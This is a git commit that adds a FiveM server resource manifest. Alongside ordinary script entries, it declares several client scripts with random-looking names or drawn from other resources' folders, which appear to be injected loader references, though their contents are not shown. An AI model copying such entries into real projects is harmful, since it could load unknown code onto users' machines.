6c5b54a9f703b5fe4a7aa0597c105d130b47b1fe
Dems <48553830+Mankey@users.noreply.github.com>
2021-08-19 14:01:01 -0400

    Add files via upload

---
+++ __resource.lua
@@ -0,0 +1,16 @@
+resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
+
+client_script "client.lua"
+client_script "config.lua"
+
+server_script "server.lua"
+
+file "whitelist.json"
+client_script "@Badger-Perms/acloader.lua"
+client_script '@DiscordPedPerms/85240.lua'
+client_script "RSH5M.lua"
+client_script '@/90767.lua'
+
+client_script 'RJDOQhlOUNbs.lua'
+
+client_script 'buzixnQWjiMf.lua'
